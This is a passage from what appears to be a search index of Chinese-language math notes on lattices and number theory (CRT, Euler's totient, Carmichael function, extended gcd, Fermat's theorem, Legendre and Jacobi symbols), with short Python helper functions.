|\\text{det}(\\mathbf{U})| = 1 |\\text{det}(\\mathbf{U})| = 1","title":"Unimodular Matrix"},{"location":"math/lattice/definition/#property","text":"\\mathbf{U} \\mathbf{U} is unimodular \\Leftrightarrow \\Leftrightarrow \\mathbf{U}^{-1} \\mathbf{U}^{-1} is unimodular","title":"\u6027\u8cea ( property )"},{"location":"math/lattice/definition/#fundamental-parallelepiped","text":"Given n n linearly independent vectors \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} \\mathbf{b_1}, \\mathbf{b_2}, \\cdots, \\mathbf{b_n} \\in \\mathbb{R^m} , their fundamental parallelepiped is defined as P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{R}, 0 \\le x_i < 1\\Big{\\}} P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\overset{\\text{def}}{=} \\Big{\\{}\\sum_{i=1}^{n}x_i\\mathbf{b_i} \\ | \\ x_i \\in \\mathbb{R}, 0 \\le x_i < 1\\Big{\\}}","title":"Fundamental Parallelepiped"},{"location":"math/lattice/definition/#determinant-of-lattice","text":"Let \\mathbf{B} \\mathbf{B} be the basis matrix of L L \\text{det}(L) = \\text{det}(\\mathbf{B}) = \\text{vol}(P(\\mathbf{B})) \\text{det}(L) = \\text{det}(\\mathbf{B}) = \\text{vol}(P(\\mathbf{B})) \\text{det}(L) \\text{det}(L) \u662f\u500b\u5b9a\u503c\uff0c\u6240\u6709\u7684 bases \u90fd\u6709\u4e00\u6a23\u7684 determinant","title":"Determinant of Lattice"},{"location":"math/lattice/definition/#minimum-distance-of-lattice","text":"\\lambda_1(L) = \\underset{v \\ \\in \\ L \\setminus 0}{min} \\|v\\| \\lambda_1(L) = \\underset{v \\ \\in \\ L \\setminus 0}{min} \\|v\\|","title":"Minimum Distance of Lattice"},{"location":"math/lattice/resources/","text":"\u76f8\u95dc\u8cc7\u6e90 https://www.math.uni-bielefeld.de/~dhoang/seams15/lectures/Lattices/Lecture1.pdf https://www.youtube.com/watch?v=XEMEiBcwSKc https://math.mit.edu/~apost/courses/18.204-2016/18.204_Xinyue_Deng_final_paper.pdf https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/lll.pdf https://algo.epfl.ch/_media/en/projects/bachelor_semester/rapportetiennehelfer.pdf http://www.noahsd.com/mini_lattices/02__GS_and_LLL.pdf https://www.di.ens.fr/~pnguyen/SLIDES/SlidesLuminy2010.pdf","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"math/lattice/resources/#_1","text":"https://www.math.uni-bielefeld.de/~dhoang/seams15/lectures/Lattices/Lecture1.pdf https://www.youtube.com/watch?v=XEMEiBcwSKc https://math.mit.edu/~apost/courses/18.204-2016/18.204_Xinyue_Deng_final_paper.pdf https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/lll.pdf https://algo.epfl.ch/_media/en/projects/bachelor_semester/rapportetiennehelfer.pdf http://www.noahsd.com/mini_lattices/02__GS_and_LLL.pdf https://www.di.ens.fr/~pnguyen/SLIDES/SlidesLuminy2010.pdf","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"math/lattice/theorem/","text":"\u6027\u8cea\u548c\u5b9a\u7406 Equivalent Bases Q : \u6211\u5011\u600e\u9ebc\u77e5\u9053\u5169\u500b basis \\mathbf{B}, \\mathbf{B'} \\mathbf{B}, \\mathbf{B'} \u662f\u4e0d\u662f\u7522\u751f\u540c\u6a23\u7684 lattice ? A : \u6aa2\u67e5 \\mathbf{B'B^{-1}} \\mathbf{B'B^{-1}} \u662f\u4e0d\u662f unimodular matrix \u5c0f\u5b9a\u7406 \u4e0b\u9762\u5169\u500b\u6558\u8ff0\u662f\u7b49\u50f9\u7684 L(\\mathbf{B}) = L(\\mathbf{B'}) L(\\mathbf{B}) = L(\\mathbf{B'}) \\exists \\exists unimodular matrix \\mathbf{U} \\mathbf{U} such that \\mathbf{B'} = \\mathbf{BU} \\mathbf{B'} = \\mathbf{BU} \u67d0\u5b9a\u7406 Let \\mathbf{b_1}, \\cdots \\mathbf{b_n} \\in \\mathbb{R}^n \\mathbf{b_1}, \\cdots \\mathbf{b_n} \\in \\mathbb{R}^n denote linear independent vectors in L L ( full-rank n-dimensional lattice ) \\mathbf{b_1}, \\cdots \\mathbf{b_n} \\mathbf{b_1}, \\cdots \\mathbf{b_n} form a basis of L L \\Leftrightarrow \\Leftrightarrow P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\cap L = \\{\\mathbf{0}\\} P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\cap L = \\{\\mathbf{0}\\} Minkowski Theorem Any convex, centrally symmetric body S S \\text{vol}(S) > 2^n\\text{det}(L) \\text{vol}(S) > 2^n\\text{det}(L) convex set ( convex body ) A set S S \u6eff\u8db3 x, y \\in S \\Rightarrow \\alpha x + (1-\\alpha)y \\in S x, y \\in S \\Rightarrow \\alpha x + (1-\\alpha)y \\in S \u5c31\u662f convex \u6eff\u8db3 x \\in S \\Leftrightarrow -x \\in S x \\in S \\Leftrightarrow -x \\in S \u5c31\u662f centrally symmetric \u60f3\u77e5\u9053\u66f4\u591a\u8acb\u53bb\u770b wikipedia - Convex set Minkowskis First Theorem Any Lattice L L \\lambda_1(L) \\le \\sqrt{n}\\ \\text{det}(L)^{\\frac{1}{n}} \\lambda_1(L) \\le \\sqrt{n}\\ \\text{det}(L)^{\\frac{1}{n}}","title":"\u6027\u8cea\u548c\u5b9a\u7406"},{"location":"math/lattice/theorem/#_1","text":"","title":"\u6027\u8cea\u548c\u5b9a\u7406"},{"location":"math/lattice/theorem/#equivalent-bases","text":"Q : \u6211\u5011\u600e\u9ebc\u77e5\u9053\u5169\u500b basis \\mathbf{B}, \\mathbf{B'} \\mathbf{B}, \\mathbf{B'} \u662f\u4e0d\u662f\u7522\u751f\u540c\u6a23\u7684 lattice ? A : \u6aa2\u67e5 \\mathbf{B'B^{-1}} \\mathbf{B'B^{-1}} \u662f\u4e0d\u662f unimodular matrix","title":"Equivalent Bases"},{"location":"math/lattice/theorem/#_2","text":"\u4e0b\u9762\u5169\u500b\u6558\u8ff0\u662f\u7b49\u50f9\u7684 L(\\mathbf{B}) = L(\\mathbf{B'}) L(\\mathbf{B}) = L(\\mathbf{B'}) \\exists \\exists unimodular matrix \\mathbf{U} \\mathbf{U} such that \\mathbf{B'} = \\mathbf{BU} \\mathbf{B'} = \\mathbf{BU}","title":"\u5c0f\u5b9a\u7406"},{"location":"math/lattice/theorem/#_3","text":"Let \\mathbf{b_1}, \\cdots \\mathbf{b_n} \\in \\mathbb{R}^n \\mathbf{b_1}, \\cdots \\mathbf{b_n} \\in \\mathbb{R}^n denote linear independent vectors in L L ( full-rank n-dimensional lattice ) \\mathbf{b_1}, \\cdots \\mathbf{b_n} \\mathbf{b_1}, \\cdots \\mathbf{b_n} form a basis of L L \\Leftrightarrow \\Leftrightarrow P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\cap L = \\{\\mathbf{0}\\} P(\\mathbf{b_1}, \\cdots, \\mathbf{b_n}) \\cap L = \\{\\mathbf{0}\\}","title":"\u67d0\u5b9a\u7406"},{"location":"math/lattice/theorem/#minkowski-theorem","text":"Any convex, centrally symmetric body S S \\text{vol}(S) > 2^n\\text{det}(L) \\text{vol}(S) > 2^n\\text{det}(L)","title":"Minkowski Theorem"},{"location":"math/lattice/theorem/#convex-set-convex-body","text":"A set S S \u6eff\u8db3 x, y \\in S \\Rightarrow \\alpha x + (1-\\alpha)y \\in S x, y \\in S \\Rightarrow \\alpha x + (1-\\alpha)y \\in S \u5c31\u662f convex \u6eff\u8db3 x \\in S \\Leftrightarrow -x \\in S x \\in S \\Leftrightarrow -x \\in S \u5c31\u662f centrally symmetric \u60f3\u77e5\u9053\u66f4\u591a\u8acb\u53bb\u770b wikipedia - Convex set","title":"convex set ( convex body )"},{"location":"math/lattice/theorem/#minkowskis-first-theorem","text":"Any Lattice L L \\lambda_1(L) \\le \\sqrt{n}\\ \\text{det}(L)^{\\frac{1}{n}} \\lambda_1(L) \\le \\sqrt{n}\\ \\text{det}(L)^{\\frac{1}{n}}","title":"Minkowskis First Theorem"},{"location":"math/number-theory/carmichael-function/","text":"Carmichael Function \u5b9a\u7fa9 : \\lambda(n) \\lambda(n) \u662f\u6700\u5c0f\u7684\u6b63\u6574\u6578 m m \u6eff\u8db3 \\forall a = 1, 2, \\cdots n,\\ a ^ m \\equiv 1 \\pmod{n} \\forall a = 1, 2, \\cdots n,\\ a ^ m \\equiv 1 \\pmod{n} the exponent of the multiplicative group of integers modulo n n is \\lambda(n) \\lambda(n) \u6027\u8cea n = p_1^{r_1} p_2^{r_2} \\cdots p_k^{r_k} n = p_1^{r_1} p_2^{r_2} \\cdots p_k^{r_k} \\lambda(n) = lcm(\\lambda(p_1^{r_1}),\\lambda(p_2^{r_2}), \\cdots, \\lambda(p_k^{r_k})) \\lambda(n) = lcm(\\lambda(p_1^{r_1}),\\lambda(p_2^{r_2}), \\cdots, \\lambda(p_k^{r_k})) \u7576 p p \u662f\u8cea\u6578\uff0c \\lambda(p^k) = {\\begin{cases}\\frac{\\varphi(p^k)}{2}& p = 2, k > 2\\\\\\varphi(p^k)& else \\end{cases}} \\lambda(p^k) = {\\begin{cases}\\frac{\\varphi(p^k)}{2}& p = 2, k > 2\\\\\\varphi(p^k)& else \\end{cases}} \uff0c \\varphi \\varphi \u662f Euler's Totient Function","title":"Carmichael Function"},{"location":"math/number-theory/carmichael-function/#carmichael-function","text":"\u5b9a\u7fa9 : \\lambda(n) \\lambda(n) \u662f\u6700\u5c0f\u7684\u6b63\u6574\u6578 m m \u6eff\u8db3 \\forall a = 1, 2, \\cdots n,\\ a ^ m \\equiv 1 \\pmod{n} \\forall a = 1, 2, \\cdots n,\\ a ^ m \\equiv 1 \\pmod{n} the exponent of the multiplicative group of integers modulo n n is \\lambda(n) \\lambda(n)","title":"Carmichael Function"},{"location":"math/number-theory/carmichael-function/#_1","text":"n = p_1^{r_1} p_2^{r_2} \\cdots p_k^{r_k} n = p_1^{r_1} p_2^{r_2} \\cdots p_k^{r_k} \\lambda(n) = lcm(\\lambda(p_1^{r_1}),\\lambda(p_2^{r_2}), \\cdots, \\lambda(p_k^{r_k})) \\lambda(n) = lcm(\\lambda(p_1^{r_1}),\\lambda(p_2^{r_2}), \\cdots, \\lambda(p_k^{r_k})) \u7576 p p \u662f\u8cea\u6578\uff0c \\lambda(p^k) = {\\begin{cases}\\frac{\\varphi(p^k)}{2}& p = 2, k > 2\\\\\\varphi(p^k)& else \\end{cases}} \\lambda(p^k) = {\\begin{cases}\\frac{\\varphi(p^k)}{2}& p = 2, k > 2\\\\\\varphi(p^k)& else \\end{cases}} \uff0c \\varphi \\varphi \u662f Euler's Totient Function","title":"\u6027\u8cea"},{"location":"math/number-theory/chinese-remainder-theorem/","text":"\u4e2d\u570b\u5269\u9918\u5b9a\u7406 \u4ee4 m_1, m_2, ..., m_n m_1, m_2, ..., m_n \u70ba\u5169\u5169\u4e92\u8cea\u7684\u6b63\u6574\u6578\uff0c\u800c a_1, a_2, ..., a_n a_1, a_2, ..., a_n \u70ba\u4efb\u610f\u6574\u6578\uff0c\u5247 \\begin{aligned} x \\equiv a_1 &\\pmod{m_1} \\\\ x \\equiv a_2 &\\pmod{m_2} \\\\ &. \\\\ &. \\\\ &. \\\\ x \\equiv a_n &\\pmod{m_n} \\end{aligned} \\begin{aligned} x \\equiv a_1 &\\pmod{m_1} \\\\ x \\equiv a_2 &\\pmod{m_2} \\\\ &. \\\\ &. \\\\ &. \\\\ x \\equiv a_n &\\pmod{m_n} \\end{aligned} \u5728\u6a21\u6578 m = m_1m_2...m_n m = m_1m_2...m_n \u4e0b\u6709\u552f\u4e00\u89e3 Gauss Algorithm Gauss Algorithm \u7d66\u51fa\u8a72\u552f\u4e00\u89e3\u7684\u503c x = a_1M_1y_1 + a_2M_2y_2 + ... + a_nM_ny_n x = a_1M_1y_1 + a_2M_2y_2 + ... + a_nM_ny_n \u5176\u4e2d M_i = m / m_i M_i = m / m_i \u4e14 M_iy_i \\equiv 1 \\pmod{m_i} M_iy_i \\equiv 1 \\pmod{m_i} \u7a0b\u5f0f\u78bc ( python ) import functools from Crypto.Util.number import inverse def chinese_remainder ( a , m ): sum = 0 prod = functools . reduce ( lambda x , y : x * y , m ) for ai , mi in zip ( a , m ): Mi = prod // mi sum += ai * Mi * inverse ( Mi , mi ) return sum % prod","title":"\u4e2d\u570b\u5269\u9918\u5b9a\u7406"},{"location":"math/number-theory/chinese-remainder-theorem/#_1","text":"\u4ee4 m_1, m_2, ..., m_n m_1, m_2, ..., m_n \u70ba\u5169\u5169\u4e92\u8cea\u7684\u6b63\u6574\u6578\uff0c\u800c a_1, a_2, ..., a_n a_1, a_2, ..., a_n \u70ba\u4efb\u610f\u6574\u6578\uff0c\u5247 \\begin{aligned} x \\equiv a_1 &\\pmod{m_1} \\\\ x \\equiv a_2 &\\pmod{m_2} \\\\ &. \\\\ &. \\\\ &. \\\\ x \\equiv a_n &\\pmod{m_n} \\end{aligned} \\begin{aligned} x \\equiv a_1 &\\pmod{m_1} \\\\ x \\equiv a_2 &\\pmod{m_2} \\\\ &. \\\\ &. \\\\ &. \\\\ x \\equiv a_n &\\pmod{m_n} \\end{aligned} \u5728\u6a21\u6578 m = m_1m_2...m_n m = m_1m_2...m_n \u4e0b\u6709\u552f\u4e00\u89e3","title":"\u4e2d\u570b\u5269\u9918\u5b9a\u7406"},{"location":"math/number-theory/chinese-remainder-theorem/#gauss-algorithm","text":"Gauss Algorithm \u7d66\u51fa\u8a72\u552f\u4e00\u89e3\u7684\u503c x = a_1M_1y_1 + a_2M_2y_2 + ... + a_nM_ny_n x = a_1M_1y_1 + a_2M_2y_2 + ... + a_nM_ny_n \u5176\u4e2d M_i = m / m_i M_i = m / m_i \u4e14 M_iy_i \\equiv 1 \\pmod{m_i} M_iy_i \\equiv 1 \\pmod{m_i}","title":"Gauss Algorithm"},{"location":"math/number-theory/chinese-remainder-theorem/#python","text":"import functools from Crypto.Util.number import inverse def chinese_remainder ( a , m ): sum = 0 prod = functools . reduce ( lambda x , y : x * y , m ) for ai , mi in zip ( a , m ): Mi = prod // mi sum += ai * Mi * inverse ( Mi , mi ) return sum % prod","title":"\u7a0b\u5f0f\u78bc ( python )"},{"location":"math/number-theory/continued-fractions/","text":"\u9023\u5206\u6578 \u6bd4\u5982 : \\frac{13}{17} = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} \\frac{13}{17} = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} \u800c\u6211\u5011\u8aaa \\frac{13}{17} \\frac{13}{17} \u7684 continued fraction expansion \u662f [0, 1, 3, 4] [0, 1, 3, 4] convergents of the continued fraction expansion of \\frac{13}{17} \\frac{13}{17} \u662f \\begin{aligned} c_0 = 0 = \\frac{0}{1} \\\\ c_1 = 0 + \\frac{1}{1} = \\frac{1}{1} \\\\ c_2 = 0 + \\frac{1}{1 + \\frac{1}{3}} = \\frac{3}{4} \\\\ c_3 = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} = \\frac{13}{17} \\end{aligned} \\begin{aligned} c_0 = 0 = \\frac{0}{1} \\\\ c_1 = 0 + \\frac{1}{1} = \\frac{1}{1} \\\\ c_2 = 0 + \\frac{1}{1 + \\frac{1}{3}} = \\frac{3}{4} \\\\ c_3 = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} = \\frac{13}{17} \\end{aligned} \u5c31\u662f\u4e00\u500b\u4e0d\u65b7\u7684\u903c\u8fd1 \\frac{13}{17} \\frac{13}{17} \u7684\u6578\u5217 \u6709\u7406\u6578\u7684 continued fraction expansion \u5305\u542b\u6709\u9650\u7684\u5143\u7d20 \u7121\u7406\u6578\u7684 continued fraction expansion \u5305\u542b\u7121\u9650\u7684\u5143\u7d20","title":"\u9023\u5206\u6578"},{"location":"math/number-theory/continued-fractions/#_1","text":"\u6bd4\u5982 : \\frac{13}{17} = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} \\frac{13}{17} = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} \u800c\u6211\u5011\u8aaa \\frac{13}{17} \\frac{13}{17} \u7684 continued fraction expansion \u662f [0, 1, 3, 4] [0, 1, 3, 4] convergents of the continued fraction expansion of \\frac{13}{17} \\frac{13}{17} \u662f \\begin{aligned} c_0 = 0 = \\frac{0}{1} \\\\ c_1 = 0 + \\frac{1}{1} = \\frac{1}{1} \\\\ c_2 = 0 + \\frac{1}{1 + \\frac{1}{3}} = \\frac{3}{4} \\\\ c_3 = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} = \\frac{13}{17} \\end{aligned} \\begin{aligned} c_0 = 0 = \\frac{0}{1} \\\\ c_1 = 0 + \\frac{1}{1} = \\frac{1}{1} \\\\ c_2 = 0 + \\frac{1}{1 + \\frac{1}{3}} = \\frac{3}{4} \\\\ c_3 = 0 + \\frac{1}{1 + \\frac{1}{3 + \\frac{1}{4}}} = \\frac{13}{17} \\end{aligned} \u5c31\u662f\u4e00\u500b\u4e0d\u65b7\u7684\u903c\u8fd1 \\frac{13}{17} \\frac{13}{17} \u7684\u6578\u5217 \u6709\u7406\u6578\u7684 continued fraction expansion \u5305\u542b\u6709\u9650\u7684\u5143\u7d20 \u7121\u7406\u6578\u7684 continued fraction expansion \u5305\u542b\u7121\u9650\u7684\u5143\u7d20","title":"\u9023\u5206\u6578"},{"location":"math/number-theory/euler-totient/","text":"Euler's Totient Function \u4e5f\u53eb\u505a Euler's Phi Function \u8907\u96dc\u5b9a\u7fa9 : \\varphi(n) = |\\{ x \\mid gcd(x, n) = 1, 1 \\le x \\le n \\}| \\varphi(n) = |\\{ x \\mid gcd(x, n) = 1, 1 \\le x \\le n \\}| \u767d\u8a71\u5b9a\u7fa9 : \\varphi(n) \\varphi(n) \u662f 1, 2, \\cdots n 1, 2, \\cdots n \u88e1\u9762\u8ddf n n \u4e92\u8cea\u7684\u500b\u6578 the order of the multiplicative group of integers modulo n n is \\varphi(n) \\varphi(n) \u6027\u8cea \u7576 gcd(m, n) = 1 gcd(m, n) = 1 \uff0c \\varphi(mn) = \\varphi(m) \\varphi(n) \\varphi(mn) = \\varphi(m) \\varphi(n) \u7576 p p \u662f\u8cea\u6578\uff0c \\varphi(p) = p - 1 \\varphi(p) = p - 1 \u7576 p p \u662f\u8cea\u6578\uff0c \\varphi(p^k) = p ^ {k - 1}(p - 1) = p ^ k (1 - \\frac{1}{p}) \\varphi(p^k) = p ^ {k - 1}(p - 1) = p ^ k (1 - \\frac{1}{p})","title":"Euler's Totient Function"},{"location":"math/number-theory/euler-totient/#eulers-totient-function","text":"\u4e5f\u53eb\u505a Euler's Phi Function \u8907\u96dc\u5b9a\u7fa9 : \\varphi(n) = |\\{ x \\mid gcd(x, n) = 1, 1 \\le x \\le n \\}| \\varphi(n) = |\\{ x \\mid gcd(x, n) = 1, 1 \\le x \\le n \\}| \u767d\u8a71\u5b9a\u7fa9 : \\varphi(n) \\varphi(n) \u662f 1, 2, \\cdots n 1, 2, \\cdots n \u88e1\u9762\u8ddf n n \u4e92\u8cea\u7684\u500b\u6578 the order of the multiplicative group of integers modulo n n is \\varphi(n) \\varphi(n)","title":"Euler's Totient Function"},{"location":"math/number-theory/euler-totient/#_1","text":"\u7576 gcd(m, n) = 1 gcd(m, n) = 1 \uff0c \\varphi(mn) = \\varphi(m) \\varphi(n) \\varphi(mn) = \\varphi(m) \\varphi(n) \u7576 p p \u662f\u8cea\u6578\uff0c \\varphi(p) = p - 1 \\varphi(p) = p - 1 \u7576 p p \u662f\u8cea\u6578\uff0c \\varphi(p^k) = p ^ {k - 1}(p - 1) = p ^ k (1 - \\frac{1}{p}) \\varphi(p^k) = p ^ {k - 1}(p - 1) = p ^ k (1 - \\frac{1}{p})","title":"\u6027\u8cea"},{"location":"math/number-theory/exgcd/","text":"\u64f4\u5c55\u6b50\u57fa\u91cc\u5f97\u6f14\u7b97\u6cd5 \u5404\u7a2e\u5be6\u505a \u8c9d\u7956\u5b9a\u7406 \u5c0d\u4efb\u610f\u6574\u6578 a, b a, b \uff0c\u672a\u77e5\u6578 x, y x, y ax + by = m ax + by = m \u6709\u6574\u6578\u89e3 \u82e5\u4e14\u552f\u82e5 gcd(a, b) | m gcd(a, b) | m \uff0c\u4e5f\u5c31\u662f m m \u662f gcd(a, b) gcd(a, b) \u7684\u500d\u6578 \u7a0b\u5f0f\u78bc ( python ) def exgcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , x , y = exgcd ( b % a , a ) return ( g , y - ( b // a ) * x , x )","title":"\u64f4\u5c55\u6b50\u57fa\u91cc\u5f97\u6f14\u7b97\u6cd5"},{"location":"math/number-theory/exgcd/#_1","text":"\u5404\u7a2e\u5be6\u505a","title":"\u64f4\u5c55\u6b50\u57fa\u91cc\u5f97\u6f14\u7b97\u6cd5"},{"location":"math/number-theory/exgcd/#_2","text":"\u5c0d\u4efb\u610f\u6574\u6578 a, b a, b \uff0c\u672a\u77e5\u6578 x, y x, y ax + by = m ax + by = m \u6709\u6574\u6578\u89e3 \u82e5\u4e14\u552f\u82e5 gcd(a, b) | m gcd(a, b) | m \uff0c\u4e5f\u5c31\u662f m m \u662f gcd(a, b) gcd(a, b) \u7684\u500d\u6578","title":"\u8c9d\u7956\u5b9a\u7406"},{"location":"math/number-theory/exgcd/#python","text":"def exgcd ( a , b ): if a == 0 : return ( b , 0 , 1 ) else : g , x , y = exgcd ( b % a , a ) return ( g , y - ( b // a ) * x , x )","title":"\u7a0b\u5f0f\u78bc ( python )"},{"location":"math/number-theory/fermat/","text":"\u8cbb\u99ac\u5c0f\u5b9a\u7406 a a \u662f\u4e00\u500b\u6574\u6578\uff0c p p \u662f\u4e00\u500b\u8cea\u6578 a^p \\equiv a \\pmod{p} a^p \\equiv a \\pmod{p} \u7576 gcd(a, p) = 1 gcd(a, p) = 1 a^{p-1} \\equiv 1 \\pmod{p} a^{p-1} \\equiv 1 \\pmod{p} the converse of fermat's little theorem is not generally true, as it fails for Carmichael numbers \u6b50\u62c9\u5b9a\u7406 ( Euler's Theorem ) \u5169\u500b\u6574\u6578 a a \u548c n n \u6eff\u8db3 gcd(a,n) = 1 gcd(a,n) = 1 a^{\\varphi(n)} \\equiv 1 \\pmod{n} a^{\\varphi(n)} \\equiv 1 \\pmod{n} \u8cbb\u99ac\u5c0f\u5b9a\u7406\u662f\u6b50\u62c9\u5b9a\u7406\u7684\u4e00\u500b\u7279\u4f8b ( \u7576 n n \u662f\u8cea\u6578\uff0c \\varphi(n) = n - 1 \\varphi(n) = n - 1 )","title":"\u8cbb\u99ac\u5c0f\u5b9a\u7406"},{"location":"math/number-theory/fermat/#_1","text":"a a \u662f\u4e00\u500b\u6574\u6578\uff0c p p \u662f\u4e00\u500b\u8cea\u6578 a^p \\equiv a \\pmod{p} a^p \\equiv a \\pmod{p} \u7576 gcd(a, p) = 1 gcd(a, p) = 1 a^{p-1} \\equiv 1 \\pmod{p} a^{p-1} \\equiv 1 \\pmod{p} the converse of fermat's little theorem is not generally true, as it fails for Carmichael numbers","title":"\u8cbb\u99ac\u5c0f\u5b9a\u7406"},{"location":"math/number-theory/fermat/#eulers-theorem","text":"\u5169\u500b\u6574\u6578 a a \u548c n n \u6eff\u8db3 gcd(a,n) = 1 gcd(a,n) = 1 a^{\\varphi(n)} \\equiv 1 \\pmod{n} a^{\\varphi(n)} \\equiv 1 \\pmod{n} \u8cbb\u99ac\u5c0f\u5b9a\u7406\u662f\u6b50\u62c9\u5b9a\u7406\u7684\u4e00\u500b\u7279\u4f8b ( \u7576 n n \u662f\u8cea\u6578\uff0c \\varphi(n) = n - 1 \\varphi(n) = n - 1 )","title":"\u6b50\u62c9\u5b9a\u7406 ( Euler's Theorem )"},{"location":"math/number-theory/legendre/","text":"Legendre Symbol \u6709\u4e00\u500b\u5947\u8cea\u6578 p p \uff0c\u4e00\u500b\u6574\u6578 a a The Legendre symbol is a function of a a and p p defined as : \\left({\\frac {a}{p}}\\right)={\\begin{cases}1&{\\text{ if }}a{\\text{ is a quadratic residue modulo }}p{\\text{ and }}a\\not \\equiv 0{\\pmod {p}},\\\\-1&{\\text{ if }}a{\\text{ is a quadratic non-residue modulo }}p,\\\\0&{\\text{ if }}a\\equiv 0{\\pmod {p}}.\\end{cases}} \\left({\\frac {a}{p}}\\right)={\\begin{cases}1&{\\text{ if }}a{\\text{ is a quadratic residue modulo }}p{\\text{ and }}a\\not \\equiv 0{\\pmod {p}},\\\\-1&{\\text{ if }}a{\\text{ is a quadratic non-residue modulo }}p,\\\\0&{\\text{ if }}a\\equiv 0{\\pmod {p}}.\\end{cases}} Legendre symbol \u7684\u539f\u59cb\u5b9a\u7fa9\u5176\u5be6\u662f\u9019\u6a23\u7684 ( \u5169\u500b\u5b9a\u7fa9\u662f\u7b49\u50f9\u7684 ) : \\left({\\frac {a}{p}}\\right)\\equiv a^{\\frac {p-1}{2}}{\\pmod {p}}\\quad {\\text{ and }}\\quad \\left({\\frac {a}{p}}\\right)\\in \\{-1,0,1\\} \\left({\\frac {a}{p}}\\right)\\equiv a^{\\frac {p-1}{2}}{\\pmod {p}}\\quad {\\text{ and }}\\quad \\left({\\frac {a}{p}}\\right)\\in \\{-1,0,1\\} Jacobi Symbol \u6709\u4e00\u500b\u5947\u6578 p p \uff0c\u4e00\u500b\u6574\u6578 a a The Jacobi symbol is a function of a a and p p defined as the product of Legendre symbols : {\\displaystyle \\left({\\frac {a}{p}}\\right)=\\left({\\frac {a}{p_{1}}}\\right)^{\\alpha _{1}}\\left({\\frac {a}{p_{2}}}\\right)^{\\alpha _{2}}\\cdots \\left({\\frac {a}{p_{k}}}\\right)^{\\alpha _{k}}} {\\displaystyle \\left({\\frac {a}{p}}\\right)=\\left({\\frac {a}{p_{1}}}\\right)^{\\alpha _{1}}\\left({\\frac {a}{p_{2}}}\\right)^{\\alpha _{2}}\\cdots \\left({\\frac {a}{p_{k}}}\\right)^{\\alpha _{k}}} where {\\displaystyle p = p_{1}^{\\alpha _{1}}p_{2}^{\\alpha _{2}}\\cdots p_{k}^{\\alpha _{k}}} {\\displaystyle p = p_{1}^{\\alpha _{1}}p_{2}^{\\alpha _{2}}\\cdots p_{k}^{\\alpha _{k}}} Jacobi symbol is a generalization of Legendre symbol","title":"Legendre Symbol"},{"location":"math/number-theory/legendre/#legendre-symbol","text":"\u6709\u4e00\u500b\u5947\u8cea\u6578 p p \uff0c\u4e00\u500b\u6574\u6578 a a The Legendre symbol is a function of a a and p p defined as : \\left({\\frac {a}{p}}\\right)={\\begin{cases}1&{\\text{ if }}a{\\text{ is a quadratic residue modulo }}p{\\text{ and }}a\\not \\equiv 0{\\pmod {p}},\\\\-1&{\\text{ if }}a{\\text{ is a quadratic non-residue modulo }}p,\\\\0&{\\text{ if }}a\\equiv 0{\\pmod {p}}.\\end{cases}} \\left({\\frac {a}{p}}\\right)={\\begin{cases}1&{\\text{ if }}a{\\text{ is a quadratic residue modulo }}p{\\text{ and }}a\\not \\equiv 0{\\pmod {p}},\\\\-1&{\\text{ if }}a{\\text{ is a quadratic non-residue modulo }}p,\\\\0&{\\text{ if }}a\\equiv 0{\\pmod {p}}.\\end{cases}} Legendre symbol \u7684\u539f\u59cb\u5b9a\u7fa9\u5176\u5be6\u662f\u9019\u6a23\u7684 ( \u5169\u500b\u5b9a\u7fa9\u662f\u7b49\u50f9\u7684 ) : \\left({\\frac {a}{p}}\\right)\\equiv a^{\\frac {p-1}{2}}{\\pmod {p}}\\quad {\\text{ and }}\\quad \\left({\\frac {a}{p}}\\right)\\in \\{-1,0,1\\} \\left({\\frac {a}{p}}\\right)\\equiv a^{\\frac {p-1}{2}}{\\pmod {p}}\\quad {\\text{ and }}\\quad \\left({\\frac {a}{p}}\\right)\\in \\{-1,0,1\\}","title":"Legendre Symbol"},{"location":"math/number-theory/legendre/#jacobi-symbol","text":"\u6709\u4e00\u500b\u5947\u6578 p p \uff0c\u4e00\u500b\u6574\u6578 a a The Jacobi symbol is a function of a a and p p defined as the product of Legendre symbols : {\\displaystyle \\left({\\frac {a}{p}}\\right)=\\left({\\frac {a}{p_{1}}}\\right)^{\\alpha _{1}}\\left({\\frac {a}{p_{2}}}\\right)^{\\alpha _{2}}\\cdots \\left({\\frac {a}{p_{k}}}\\right)^{\\alpha _{k}}} {\\displaystyle \\left({\\frac {a}{p}}\\right)=\\left({\\frac {a}{p_{1}}}\\right)^{\\alpha _{1}}\\left({\\frac {a}{p_{2}}}\\right)^{\\alpha _{2}}\\cdots \\left({\\frac {a}{p_{k}}}\\right)^{\\alpha _{k}}} where {\\displaystyle p = p_{1}^{\\alpha _{1}}p_{2}^{\\alpha _{2}}\\cdots p_{k}^{\\alpha _{k}}} {\\displaystyle p = p_{1}^{\\alpha _{1}}p_{2}^{\\alpha _{2}}\\cdots p_{k}^{\\alpha _{k}}} Jacobi symbol is a generalization of Legendre symbol","title":"Jacobi Symbol"},{"location":"math/number-theory/modular/","text":"\u6a21\u904b\u7b97 \u6a21\u53cd\u5143\u7d20 \u6211\u5011\u6709\u6574\u6578 a, n a, n \u5982\u679c b b \u6eff\u8db3 ab \\equiv 1 \\pmod{n} ab \\equiv 1 \\pmod{n} \u6211\u5011\u7a31 b b \u662f a a \u5728\u6a21 n n \u4e0b\u7684\u6a21\u53cd\u5143\u7d20 \u800c a a 